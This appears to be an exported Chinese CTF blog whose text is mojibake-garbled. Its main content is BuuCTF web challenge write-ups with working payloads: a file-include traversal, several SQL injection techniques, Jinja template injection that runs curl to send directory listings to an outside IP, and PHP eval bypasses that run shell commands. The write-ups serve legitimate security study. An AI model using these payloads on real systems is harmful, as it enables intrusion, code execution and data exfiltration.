{"pages":[{"title":"About","text":"å…³äºæˆ‘åå·¥å¤§ä¸‰ä¿¡å®‰ä¸“ä¸šåœ¨è¯», ç†Ÿç»ƒä½¿ç”¨C-c C-vç¼–ç¨‹ å¸¸ç”¨ID cjM00N or æœˆäº® ç›®å‰ä¸ºKap0kæˆ˜é˜ŸWebæ‰‹, NSç©å®¶ , å‰ä»–åˆå­¦è€…, èŒä¸šé€’èŒ¶ç©å®¶ ä»¥åŠå•èº« è”ç³»æ–¹å¼Email: Y2ptMDBuQHFxLmNvbQ==or è¯„è®ºå‡å¯","link":"/about/index.html"},{"title":"Friends","text":"ç»™å¤§å“¥ä»¬é€’èŒ¶.gif Verhttps://vergissmeinnichtz.github.io/ ä¸‰çº¿ç¨‹éœ¸ä¸», æ—¥å¸¸AKå¯†ç çš„äº”è¾¹å½¢é€‰æ‰‹ C0mRaDehttps://coomrade.github.io/ Webå¤§å“¥, Kap0kçµé­‚æ”¯æŸ± Byzerohttps://www.zerocre.com/ Pwnçˆ·çˆ· Q4nhttps://q4n.github.io/ å¹´è½»çš„Pwnçˆ·çˆ· Sjoshuahttp://sforest.in/ MISCéœ¸ä¸», ACM&CTFåŒä¿®é€‰æ‰‹, æ¸—é€Uppp","link":"/friends/index.html"}],"posts":[{"title":"BuuCTFåˆ·é¢˜è®°å½•","text":"æ„Ÿè°¢glzjinå¸ˆå‚… [HCTF 2018]WarmUpè¿™æ˜¯CISCN2019åå—èµ›åŒºåŠå†³èµ›çš„é¢˜ç›®â€¦å½“æ—¶æ²¡åšå‡ºæ¥ å¤ªèœäº† é¢˜ç›®æºè‡ª CVE-2018-12613 æºç å¦‚ä¸‹ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849\"source.php\",\"hint\"=>\"hint.php\"]; if (! isset($page) || !is_string($page)) { echo \"you can't see it\"; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } echo \"you can't see it\"; return false; } } if (! empty($_REQUEST['file']) && is_string($_REQUEST['file']) && emmm::checkFile($_REQUEST['file']) ) { include $_REQUEST['file']; exit; } else { echo \"\"; } ?> è¿™é‡Œå¯ä»¥çœ‹åˆ°, æœ‰is_stringçš„åˆ¤æ–­, æ•°ç»„ç»•è¿‡æ˜¯ä¸å¯è¡Œçš„, åªèƒ½ç»•è¿‡checkFile, è€ŒcheckFileé‡Œé¢æœ‰äºŒæ¬¡urldecode, è¿™ç»™æˆ‘ä»¬æä¾›äº†æœºä¼š, å¦‚æœæˆ‘ä¼ ä¸€ä¸ª 1?file=source.php%253f å…¶ä¸­%253fæ˜¯?çš„äºŒæ¬¡ç¼–ç , è¿™æ ·æ—¢å¯ç»•è¿‡å‰é¢çš„æ£€æµ‹, é‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯ä½¿ç”¨ç›®å½•ç©¿è¶Šäº† å…ˆè®¿é—®hint.php, å¯ä»¥çœ‹åˆ° 1flag not here, and flag in ffffllllaaaagggg è¿™é‡Œæœ‰ä¸ªçŸ¥è¯†ç‚¹æ˜¯, å½“äºŒé‡ç¼–ç æ—¶, è¿™é‡Œçš„source.phpç›¸å½“äºä¸€ä¸ªç›®å½•, ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä½äº 12location: /var/www/html/source.php/flag: /ffffllllaaaagggg æ‰€ä»¥4æ¬¡ç›®å½•ç©¿è¶Š, payloadå¦‚ä¸‹ 1?file=source.php%253f/../../../../ffffllllaaaagggg æˆ–è€…ä¸ç”¨åˆ¤æ–­å¤šå°‘ç›´æ¥å¤šæ¥å‡ ä¸ª/../ä¹Ÿå¯ä»¥ æœ€ç»ˆpayload 1?file=source.php%253f/../../../../ffffllllaaaagggg [å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨è§£é¢˜ä¸€fuzzä¹‹åå‘ç°è¿‡æ»¤äº†select ä¸Šç½‘æ‰¾æ‰¾æœ‰æ²¡æœ‰èƒ½ç»•è¿‡selectçš„æ–¹æ³•, æŸ¥åˆ°äº†å †å è¿‡æ»¤, ç®€å•æµ‹ä¸€ä¸‹, æˆ‘ä»¬å…ˆè¾“å…¥ä¸€ä¸ªå¤åˆè¯­å¥ 11';show tables; å¯ä»¥çœ‹åˆ°è¾“å‡ºæ­£å¸¸, è¯´æ˜åç«¯çš„å®ç°åº”è¯¥æ˜¯ 1mysqli_multi_query($sql); è€Œå¹³æ—¶çš„å®ç°æ˜¯mysql_queryè¿™æ ·çš„è¯­å¥å¯ä»¥æ”¯æŒå¤šæ¡sqlè¯­å¥åŒæ—¶æ‰§è¡Œ, é‚£è¦ç»•è¿‡selectçš„è¿‡æ»¤çš„è¯å¯ä»¥ä½¿ç”¨ 1set @t=0x68616861686168;prepare x from @t;execute x; é¢„ç¼–è¯‘è¯­å¥æ¥æ‰§è¡Œ, å…¶ä¸­@tçš„éƒ¨åˆ†æ˜¯æ‰§è¡Œè¯­å¥çš„hexç¼–ç , ä¾‹å¦‚æˆ‘ä»¬è¦æ‰§è¡Œ 1select * from `1919810931114514`; hexç¼–ç åæ›¿æ¢ä¸Šé¢çš„aaaaaå³å¯ è§£é¢˜äºŒè¿™é‡Œå…¶å®å·²ç»æœ‰äº†ä¸€ä¸ªselect, é‚£æˆ‘ä»¬å¦‚æœåˆ©ç”¨è¿™ä¸ªæ¥æŸ¥è¯¢çš„è¯å°±å¯ä»¥ç›´æ¥æŸ¥è¯¢flagäº† å…ˆæŸ¥çœ‹ä¸€ä¸‹ä¸¤ä¸ªè¡¨çš„ç»“æ„, è¡¨åæˆ‘ä»¬å‰é¢å·²ç»æŸ¥å‡ºæ¥äº† 11';show columns from words; æœ‰ä¸¤ä¸ªåˆ—, ä¸€ä¸ªæ˜¯idå¦ä¸€ä¸ªæ˜¯data, æ˜æ˜¾idå°±æ˜¯æŸ¥è¯¢çš„ç´¢å¼•, æ‰€ä»¥å…ˆé‡å‘½åä¸¤ä¸ªè¡¨ 1RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;# å¯ä»¥ç»™è¡¨å¢åŠ ä¸€ä¸ªidåˆ—æˆ–è€…ç›´æ¥å°†flagåˆ—æ”¹æˆidåˆ—, ç„¶åä¸‡èƒ½å¯†ç  11' or 1=1# æŸ¥å‡ºflag GetFlagæœ€ç»ˆpayloadå¦‚ä¸‹ 11';Set @t=0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460;Prepare x from @t; Execute x; [å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢å¼ºç½‘æ¯çš„é¢˜ç›®, æ‹‰ä¸‹æ¥æœ‰3001ä¸ªæ··æ·†è¿‡çš„php, éšä¾¿æ‰“å¼€åå¯ä»¥çœ‹åˆ°æœ‰è¾“å‡º å›æ¥çœ‹ä¸€ä¸‹æºç , å¯ä»¥çœ‹åˆ°æœ‰è®¸å¤šgetæˆ–è€…postçš„å‚æ•°, å¹¶ä¸”æœ‰eval, system, assertç­‰ç³»ç»Ÿå‡½æ•°, ä½†æ˜¯å¤§éƒ¨åˆ†éƒ½èµ‹å€¼æˆ–è€…æ— æ³•ä½¿ç”¨ å½“æ—¶æ¯”èµ›çš„æ—¶å€™è¿˜å‚»ä¹ä¹çš„ç”¨phpstormå»ä¸€è¡Œè¡Œè·Ÿè¿‡, è¿™é¢˜ä¸»è¦è€ƒå¯Ÿçš„æ˜¯fuzzçš„æƒ³æ³•, é€šè¿‡å¯¹è¿™äº›æ–‡ä»¶è¿›è¡Œfuzzæ¥æŸ¥æ‰¾å¯ä»¥ä½¿ç”¨çš„å‚æ•°, é¦–å…ˆéœ€è¦å¯åŠ¨phpæœåŠ¡, åœ¨winä¸‹æˆ‘ä»¬ä½¿ç”¨phpstudyç›´æ¥å¼€å°±å¯ä»¥äº†, linuxä¸‹ç›´æ¥ 1php -S 0:8080 å³å¯è®¿é—®, ç„¶åæ˜¯é€šè¿‡æ­£åˆ™å»åŒ¹é…ä¼ å…¥çš„å‚æ•°å 1(?","link":"/2020/02/14/BuuCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"title":"BuuCTFåˆ·é¢˜è®°å½•2","text":"æ„Ÿè°¢glzjinå¸ˆå‚… [WesternCTF2018]shrineé¦–å…ˆçœ‹é¢˜ç›® 1234567891011121314151617181920212223242526import flaskimport osapp = flask.Flask(__name__)app.config['FLAG'] = os.environ.pop('FLAG')@app.route('/')def index(): return open(__file__).read()@app.route('/shrine/')def shrine(shrine): def safe_jinja(s): s = s.replace('(', '').replace(')', '') blacklist = ['config', 'self'] return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s return flask.render_template_string(safe_jinja(shrine))if __name__ == '__main__': app.run(debug=True) WAFåªæœ‰è¿‡æ»¤()å’Œè®¾ç½®configä»¥åŠselfä¸ºç©º, è€Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°flagåœ¨app.configé‡Œé¢, è¿™é‡Œå‚è€ƒ https://www.jianshu.com/p/1237c78a691c æ²¡æœ‰äº†ç›´æ¥çš„config, æˆ‘ä»¬å¯ä»¥é€šè¿‡current_appæ¥è·å–, é€šè¿‡æŸ¥é˜…æ‰‹å†Œ, å¯ä»¥å‘ç°åœ¨å‡½æ•°url_forä¸­å­˜åœ¨è¿™ä¸ªå˜é‡ é‚£ä¹ˆå°±å¯ä»¥é€šè¿‡ä¸‹é¢çš„payloadæ¥è·å– 1{{url_for.__globals__['current_app'].config}} åŒæ ·çš„å‡½æ•°è¿˜æœ‰get_flashed_messages æˆ–è€…ä½¿ç”¨ 1{{app.__init__.__globals__.sys.modules.app.app.__dict__}} å›½å¤–å¤§ä½¬çš„æ–¹æ³•å°±æ¯”è¾ƒç¡¬æ ¸äº† https://ctftime.org/writeup/10851 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# search.pydef search(obj, max_depth): visited_clss = [] visited_objs = [] def visit(obj, path='obj', depth=0): yield path, obj if depth == max_depth: return elif isinstance(obj, (int, float, bool, str, bytes)): return elif isinstance(obj, type): if obj in visited_clss: return visited_clss.append(obj) print(obj) else: if obj in visited_objs: return visited_objs.append(obj) # attributes for name in dir(obj): if name.startswith('__') and name.endswith('__'): if name not in ('__globals__', '__class__', '__self__', '__weakref__', '__objclass__', '__module__'): continue attr = getattr(obj, name) yield from visit(attr, '{}.{}'.format(path, name), depth + 1) # dict values if hasattr(obj, 'items') and callable(obj.items): try: for k, v in obj.items(): yield from visit(v, '{}[{}]'.format(path, repr(k)), depth) except: pass # items elif isinstance(obj, (set, list, tuple, frozenset)): for i, v in enumerate(obj): yield from visit(v, '{}[{}]'.format(path, repr(i)), depth) yield from visit(obj) ä¿®æ”¹çš„app.py 123456789101112131415161718192021import flaskimport osfrom flask import requestfrom search import searchapp = flask.Flask(__name__)app.config['FLAG'] = 'TWCTF_FLAG'@app.route('/')def index(): return open(__file__).read()@app.route('/shrine/')def shrine(shrine): for path, obj in search(request, 10): if str(obj) == app.config['FLAG']: return pathif __name__ == '__main__': app.run(debug=True) é€šè¿‡éå†requestæ¥æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨æŸä¸ªå­å±æ€§å’Œapp.config['FLAG']æ˜¯ä¸€è‡´çš„, æœ€åæ‰¾çš„payloadæ˜¯ 1{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}} å…¶å®å¯ä»¥çœ‹åˆ°å’Œå‰é¢çš„æ€è·¯æ˜¯ä¸€è‡´çš„, åªæ˜¯è·å–çš„è·¯å¾„ä¸åŒ [GWCTF 2019]ä½ çš„åå­—é¡ºå¸¦å°±æ¥åšä¸€ä¸‹ä¸Šæ¬¡æ¯”èµ›æ²¡æ•´å‡ºæ¥çš„SSTI è¿™é“é¢˜å…¶å®å¾ˆæ˜æ˜¾çš„æ˜¯æ¨¡æ¿æ³¨å…¥, å‡ºé¢˜äººæ¶è¶£å‘³çš„ç”¨äº†index.phpè¿™æ ·çš„è·¯ç”±, ä½†æ˜¯å®é™…ä¸Šè¿˜æ˜¯ä¸€é“pythoné¢˜ å…ˆæ¥fuzzä¸€ä¸‹ å½“è¾“å…¥ä¸ºclassçš„æ—¶å€™, ç»“æœä¼šè¢«è¿‡æ»¤, åº”è¯¥æ˜¯æœ‰waf ç”¨6æµ‹ä¸€ä¸‹å‘ç°è¿˜æœ‰phpçš„æŠ¥é”™, è¿™æ˜¯çœŸçš„sxbk ä½†æ˜¯è¿™é‡Œæ˜¯ç”¨ä¸äº†äº† æˆ‘ä»¬ä¸Šç½‘æŸ¥ä¸€ä¸‹å°±ä¼šå‘ç°, åœ¨sstiä¸­è¿‡æ»¤äº†å, å¯ä»¥é€šè¿‡{\\%å¤–å¸¦ Pythonæ¨¡æ¿æ³¨å…¥(SSTI)æ·±å…¥å­¦ä¹  ä¸Šé¢é“¾æ¥ä¸­çš„payloadæ”¹ä¸€ä¸‹å°±å¯ä»¥ç”¨ 1{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://xx.xxx.xx.xx:8080/?i=`ls /`') %}1{% endif %} ä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªé—®é¢˜æ˜¯æœ‰å…³é”®å­—ç¬¦çš„è¿‡æ»¤, ä¸Šç½‘æ‰¾ä¸€ä¸‹sstiçš„å­—å…¸ å½“ç„¶æ˜¯æ²¡æ‰¾åˆ°äº† å¯ä»¥å‘ç°åŒå†™ç»•ä¸è¿‡, åº”è¯¥æ˜¯å¾ªç¯åŒ¹é…, æ›¿æ¢ä¸ºç©ºçš„è¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹æ¥ç»•è¿‡, ä½†æ˜¯è¿™é‡Œæ¯«æ— æç¤º, æ„Ÿè§‰åªèƒ½çº¯é çŒœ, æ‰¾åˆ°ä¸€ä¸ªè¯ç¬¦åˆä»¥ä¸‹æ¡ä»¶ åœ¨ban_listä¸­å°½é‡é å ä¸å‡ºç°åœ¨æˆ‘ä»¬çš„payloadé‡Œé¢ ç”±äºç¬¬ä¸€ä¸ªæ˜¯é»‘ç®±, æˆ‘ä»¬åªèƒ½ä»ç¬¬äºŒä¸ªå…¥æ‰‹ fuzzè„šæœ¬ 12345678910111213141516171819202122232425262728293031323334353637import reimport requestsfrom time import sleepurl = \"http://f9fd3c30-c575-4a29-88a3-680ebc168df5.node3.buuoj.cn\"def gen_words(): f = open(\"ssti_payload.txt\", \"r\").read() words = re.findall(\"[a-zA-Z]+\", f) f = open(\"ssti_word.txt\", \"w\") res = sorted(list(set(words))) for i in res: f.write(i + \"\\n\") return resdef find_unused_word(words, payload): used_word = list(set(re.findall(\"[a-zA-Z]+\", payload))) return [i for i in words if i not in used_word]def fuzz(): payload = \"{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://xx.xxx.xx.xx:8080/?i=`ls /`') %}1{% endif %}\" words = gen_words() unused_word = find_unused_word(words, payload) for i in unused_word: data = { \"name\": i } res = requests.post(url, data=data).text if \"hello !\" in res: data = { \"name\": \"cla\" + i + \"ss\" } res = requests.post(url, data=data).text if \"class\" in res: print(f\"[*] find {i}\") sleep(0.1)if __name__ == \"__main__\": fuzz() ç”±äºç»“æœåªæœ‰å‡ ä¸ª, æˆ‘ä»¬æŒ¨ä¸ªè¯•ä¸€ä¸‹, å°±ä¼šå‘ç°configæ˜¯å¯ç”¨çš„ ä½¿ç”¨å°å·å¼€ä¸€ä¸ªLinux labs ä¹‹åå†æ”¹é€ ä¸€ä¸‹payload 1{% iconfigf ''.__claconfigss__.__mrconfigo__[2].__subclaconfigsses__()[59].__init__.func_gloconfigbals.linecconfigache.oconfigs.popconfigen('curl http://174.0.167.222:2333/ -d `ls /|base64`') %}1{% endiconfigf %} æ³¨æ„è¿™é‡Œæœ€åå¿…é¡»è¦æ˜¯endiconfigf, ä¸æ˜¯å¾ˆæ‡‚ä¸ºä»€ä¹ˆ, çŒœæµ‹æ˜¯è¦å’Œå‰é¢çš„iconfigfä¸€è‡´å§, å…¶ä»–çš„æƒ…å†µéƒ½ä¼šå¯¼è‡´æ‰“ä¸é€š ç„¶åæˆ‘ä»¬å°±å¯ä»¥rceäº†, ç”±äºè¿”å›åªæœ‰ä¸€è¡Œ, å°±æ‹¼æ¥äº†ä¸ª|base64 [SWPU2019]Web1è¿™é¢˜å’‹ä¸€çœ‹è¿˜ä»¥ä¸ºæ˜¯ä¸ªXSSâ€”- ä½†æ˜¯è¿™ç®¡ç†å‘˜ä¸€ç›´ä¸ç¡®è®¤çš„å°±å¾ˆè¿·æƒ‘äº† ç„¶åæŸ¥äº†ä¸€ä¸‹æ‰å‘ç°ä¸æ˜¯XSSæ˜¯ä¸ªSQLé¢˜ å¯ä»¥çœ‹åˆ°æ³¨å…¥ç‚¹æœ‰å‡ ä¸ª, æ¯”å¦‚ç”³è¯·å¹¿å‘Šè¿™é‡Œ è¿˜æœ‰æŸ¥çœ‹çš„æ—¶å€™ æµ‹è¯•ä¸€ä¸‹å‘ç°idé‚£é‡Œæ‰“ä¸é€š, å°±å›åˆ°å¹¿å‘Šè¿™é‡Œ, é¡ºåˆ©çš„çœ‹åˆ°äº†æ³¨å…¥ç‚¹ å½“ç„¶è¿™ä¸§å¿ƒç—…ç‹‚çš„22åˆ—æ˜¯çœŸçš„é¡¶ é¦–å…ˆå¯ä»¥çœ‹åˆ°è¢«è¿‡æ»¤, ç›´æ¥ä½¿ç”¨/**/æˆ–è€…(å°±å¯ä»¥ç»•è¿‡äº†, ä¸»è¦æ˜¯ä¸‹é¢ä¸¤ç‚¹ Bypass information_schemaåšè¿‡sqliçš„éƒ½çŸ¥é“è¿™ä¸ªåº“çš„å‰å®³, ä½†æ˜¯ç°åœ¨ä¹Ÿç»å¸¸è¢«è¿‡æ»¤ (ä¾‹å¦‚è¿‡æ»¤or), é‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦æ–°çš„å§¿åŠ¿äº† https://www.anquanke.com/post/id/193512 https://www.cnblogs.com/wangtanzhi/p/12241499.html å¯ä»¥çœ‹åˆ°å¤§éƒ¨åˆ†æ˜¯ç”¨äº†sys.schema_auto_increment_columnsè¿™ä¸ªåº“ ç”±äºåœ¨Buuojä¸Šé¢æ²¡æœ‰è¿™ä¸ªåº“, è¿™é‡Œç”¨çš„å§¿åŠ¿æ˜¯ 1-1'union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 è¿™æ ·æ¥è·å–è¡¨å æ— åˆ—åæ³¨å…¥å…ˆå›é¡¾ä¸€ä¸‹æˆ‘ä»¬å¸¸è§„çš„æ€è·¯, ä¸€èˆ¬æˆ‘ä»¬æ˜¯é€šè¿‡information_schema.columnsæ³¨å…¥å‡ºæ‰€æœ‰åˆ—åå†è¿›è¡ŒæŸ¥è¯¢, è€Œè¿™é‡Œæˆ‘ä»¬ç”¨ä¸äº†è¿™ä¸ªåº“, å°±å¯ä»¥è€ƒè™‘æ— åˆ—åæ³¨å…¥ 1select 1,2,3; æ­¤æ—¶å¯ä»¥çœ‹åˆ°åˆ—ååˆ†åˆ«ä¸º1,2,3 1select 1,2,3 union select * from users; è¿™é‡Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬é€šè¿‡unionè¿æ¥æ¥æ”¹å˜åŸæ¥çš„åˆ—å, æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ 1select `2` from (select 1,2,3 union select * from users)x; è¿™é‡Œæœ‰å‡ ä¸ªæ³¨æ„çš„ç‚¹ åˆ—åç”¨åå¼•å·, è¿™é‡Œå› ä¸ºæ˜¯æ•°å­—, æˆ‘ä»¬éœ€è¦ä½¿ç”¨åå¼•å·åŒ…èµ·æ¥, å¦‚æœä¸ç”¨çš„è¯ä¼šå…¨éƒ¨å˜æˆ2 å­selectè¦ç”¨()åŒ…èµ·æ¥ å­selectæœ€åè¦èµ‹äºˆä¸€ä¸ªåˆ«å, ä¸ç„¶ä¼šæŠ¥é”™ ç„¶åæˆ‘ä»¬å°±å¯ä»¥æ³¨å…¥äº† 12-1'union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 æˆ‘ç°åœ¨æ‰å‘ç°select*from usersæ˜¯æˆç«‹çš„, ä¸­é—´ä¸éœ€è¦ç”¨ç©ºæ ¼â€¦. ç„¶åå°±å¯ä»¥æ‹¿flagäº† [CISCN 2019 åˆèµ›]Love Mathè¿™é“é¢˜è›®æœ‰æ„æ€çš„, å…ˆçœ‹ä»£ç  12345678910111213141516171819202122232425262728= 80) { die(\"å¤ªé•¿äº†ä¸ä¼šç®—\"); } $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $content)) { die(\"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦\"); } } //å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(\"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°\"); } } //å¸®ä½ ç®—å‡ºç­”æ¡ˆ eval('echo '.$content.';');} ä»£ç ä¸­åšäº†ä¸‰ä¸ªåˆ¤æ–­ é•¿åº¦å¿…é¡»å°äº80 è¿‡æ»¤ä¸€éƒ¨åˆ†ç¬¦å· 1' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]' åŒ¹é…æ‰€æœ‰å‡½æ•°å˜é‡åå¿…é¡»åœ¨$whitelistä¸­, æ¯”å¦‚pi è¿™ä¸ªæ­£åˆ™æ¥æºå¯ä»¥è§ https://www.php.net/manual/zh/language.variables.basics.php å…¶å®ç¬¬ä¸€ä¸ªæ˜¯æœ€éš¾çš„hhhh çœ‹ä¸€ä¸‹æ‰‹å†Œå°±å¯ä»¥çœ‹åˆ°, æœ‰ä¸ªå‡½æ•°å¾ˆç‰¹åˆ« è¿™ä¸ªè¿”å›å€¼æ˜¯stringå°±å¾ˆå¦™äº†, é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™æ ·çš„æ–¹æ³•æ¥è½¬æ¢å‡ºæˆ‘ä»¬éœ€è¦çš„å­—ç¬¦ 123$command = \"phpinfo\";echo base_convert($command,36,10);# >:55490343972 è¿™æ ·å°±èƒ½å¾—åˆ°ä¸€ä¸ªçº¯æ•°å­—, ç„¶åé€šè¿‡ 1base_convert(55490343972,10,36)(); å°±å¯ä»¥æ‰§è¡Œäº† ç„¶ååŒç†æˆ‘ä»¬å¯ä»¥æ‹¼å‡º 12base_convert(1751504350,10,36)(base_convert(784,10,36));# system(ls) ä½†æ˜¯è¯»æ–‡ä»¶å°±æ¯”è¾ƒå›°éš¾äº†, base_convertåªèƒ½è½¬æ¢[a-z0-9], è€Œè¯»æ–‡ä»¶éœ€è¦ç©ºæ ¼, æœ¬é¢˜çš„flagåœ¨/flag, é‚£å°±åŠ¿å¿…éœ€è¦èƒ½å¤Ÿè½¬æ¢ç‰¹æ®Šå­—ç¬¦çš„å‡½æ•°äº†, è¿™é‡Œæœ‰ä¸¤ä¸ªæ€è·¯ hex2binå…ˆçœ‹ä¸€ä¸‹æ‰‹å†Œ è¿™ä¸ªå‡½æ•°å¯ä»¥å®ç°å°†Hexè½¬æ¢æˆå­—ç¬¦ä¸², ä¹Ÿå°±æ˜¯ ä½†æ˜¯è¿™æ ·ä¼šå‡ºç°å­—æ¯, æœ¬åœ°å…ˆè½¬æ¢æˆ10è¿›åˆ¶, ç„¶ååœ¨payloadä½¿ç”¨dechexè½¬æ¢å›å»å°±å¯ä»¥äº†, å…·ä½“æ“ä½œå¦‚ä¸‹ 123base_convert(696468,10,36)(base_convert(37907361743,10,36)(dechex(1819484207)))# system(hex2bin(dechex(1819484207)))# system('ls /') å½“ç„¶æƒ³æ³•å¾ˆå¥½, é•¿åº¦å´ä¸å¤Ÿäº†, è¿™é‡Œçš„æ›¿æ¢æ€è·¯æœ‰ä¸¤ä¸ª, ä¸€ä¸ªæ˜¯å°†systemæ¢æˆexec, å¹¶æ›´æ”¹è¿›åˆ¶æ¥å°½é‡å‡å°‘ä½æ•°, åªè¦ä¸å‡ºç°å­—æ¯å°±å¯ä»¥äº† 12base_convert(47138,20,36)(base_convert(3761671484,13,36)(dechex(1819484207)))# exec('ls /') åˆšå¥½79, å¯ä»¥æ‰§è¡Œ ä½†æ˜¯æ²¡æœ‰å…¨éƒ¨è¿”å›hhh, è¿™é‡ŒçŸ¥é“æ˜¯åœ¨/flag, å°±å¯ä»¥ç›´æ¥æ‰“, ä¸è¿‡å‘½ä»¤ä¹Ÿæ˜¯æ¯”è¾ƒå–å·§ 12base_convert(47138,20,36)(base_convert(3761671484,13,36)(dechex(474260451114)))# exec('nl /*') å¦å¤–ä¸€ç§å°±æ˜¯æ„é€ $_GET, ç„¶åå°±å¯ä»¥ä¸ºæ‰€æ¬²ä¸ºäº†hhhh 1234$pi=base_convert(3761671484,13,36)(dechex(1598506324));$$pi{0}($$pi{1})# $pi=hex2bin(dechex(1598506324));# $pi=_GET# $$pi=$_GET è¿™é‡Œåˆ©ç”¨çš„æ˜¯phpçš„å¯å˜å˜é‡ç‰¹æ€§ å‰©ä¸‹çš„å°±æ˜¾è€Œæ˜“è§äº† ä»å…¶ä»–ä½ç½®è·å–å‚æ•°å¯ä»¥åœ¨ https://xz.aliyun.com/t/4906#toc-8 ä¸­çœ‹åˆ°ROISä½¿ç”¨çš„payloadæ˜¯ 12$pi=base_convert;$pi(371235972282,10,28)(($pi(8768397090111664438,10,30))(){9})# system(getallheaders(){9}) å®æµ‹çš„æ—¶å€™ä¸€ç›´æ²¡æœ‰æ‰“é€š, ç ”ç©¶äº†ä¸€ä¸‹å‘ç°è¿™ä¸ªpayloadéœ€è¦åœ¨apacheç¯å¢ƒä¸‹ buuä¸Šæ˜¯ç”¨nginx, æ‰€ä»¥æ‰“ä¸é€š, å…¶ä»–çš„ç±»ä¼¼å‡½æ•°å› ä¸ºé•¿åº¦é—®é¢˜ç”¨ä¸äº†, å°±å½“äº†è§£ä¸€ä¸‹äº† [æå®¢å¤§æŒ‘æˆ˜ 2019]RCE MEå‚è€ƒ https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html è¿™ä¸ªè¿‡æ»¤çš„è¯å¾ˆæ˜æ˜¾å°±èƒ½æƒ³åˆ°pç¥ä¸Šé¢é‚£ç¯‡æ–‡ç« , ç›´æ¥å–åå°±å¯ä»¥ç»•è¿‡äº†, ç„¶åæˆ‘ä»¬æƒ³åŠæ³•æ‰§è¡Œ, å…ˆçœ‹ä¸€ä¸‹phpinfo() 1(~%8F%97%8F%96%91%99%90)(); ç„¶åæ˜¯disable_function 1pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl å¯ä»¥çœ‹åˆ°mailæ²¡æœ‰è¢«ç¦, é‚£ä¹ˆæˆ‘ä»¬å¾…ä¼šå°±å¯ä»¥ç”¨æ¥ç»•è¿‡ è¿™é‡Œçš„è¯æˆ‘ä»¬åªèƒ½å¤Ÿæ‹¼æ¥assertè€Œä¸èƒ½æ‹¼æ¥eval, è¿™æ˜¯ç”±phpçš„ç‰¹æ€§å†³å®šçš„ ç„¶åçœ‹ä¸€ä¸‹ç¯å¢ƒæ˜¯åœ¨Apacheä¸‹, é‚£ä¹ˆæœ‰ä¸€è¯´ä¸€è¿˜æ˜¯getallheadersèˆ’æœ å‚è€ƒ https://evoa.me/index.php/archives/62/ 12(~%9E%8C%8C%9A%8D%8B)((~%91%9A%87%8B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)()));# assert(next(getallheaders())); ç„¶ååœ¨User-Agentè¾“å…¥å‘½ä»¤å³å¯ 